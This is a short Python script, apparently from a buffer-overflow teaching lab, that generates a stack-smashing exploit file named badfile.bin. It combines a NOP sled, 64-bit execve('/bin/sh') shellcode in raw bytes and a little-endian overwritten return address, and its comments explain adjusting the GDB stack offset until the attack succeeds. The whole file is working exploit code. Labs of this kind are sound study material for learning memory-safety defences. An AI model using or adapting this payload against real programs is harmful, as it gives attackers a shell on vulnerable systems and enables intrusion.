#! /usr/bin/env python3

import sys
import argparse

def main():
	parser = argparse.ArgumentParser(description="Generate Payload File.")
	parser.add_argument("GDB_SHIFT", help="Offset (int) the GDB shifting address to lower address...")

	# Replace the content with the actual shellcode
	# 64-bit execve('/bin/sh') setuid shellcode
	SHELLCODE = (
	    b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
	    b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
	    b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
	)

	OFFSET = 120  # 112 Offset to rbp + 8 bytes
	SHELLCODE_LEN = len(SHELLCODE)
	ADD_LEN = 8  # Length of the address 4 bytes for 32-bit and 8 bytes for 64-bit
	NOP_LEN = OFFSET - SHELLCODE_LEN
	
	args = parser.parse_args()
	
	GDB_SHIFT_COMPENSATION = int(args.GDB_SHIFT) # stack is shigted higher in GDB due to its own environment variables, args, etc.
	RET_ADD = 0x7fffffffc550 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address

	# Remove the 00 from the address
	# Note, GDB_SHIFT_COMPENSATION is added because the address shown in the gdb is different from
	# the actual address shown in the stack when the program is running.
	# This is because gdb pushes some values to the stack before running the program.
	# You can try different values to get the correct address if the attack is not successful.
	# Also, leading 00s not printed in gdb, but are automatically added by
	#  .to_bytes(ADD_LEN, byteorder='little') to make it 8 bytes long.

	#####################################################################
	# Build the payload
	# The content of the badfile is as follows:
	NOP_SLED = b'\x90'*NOP_LEN
	repeated_add = (RET_ADD).to_bytes(ADD_LEN, byteorder='little')
	payload = NOP_SLED + SHELLCODE + repeated_add

	# Write the payload to a binary file
	file = 'badfile.bin'
	with open(file, 'wb') as f:
	    f.write(payload)
	print(f'{file} payload file created.')
	

	#####################################################################
	
if __name__ == "__main__":
	main()
	
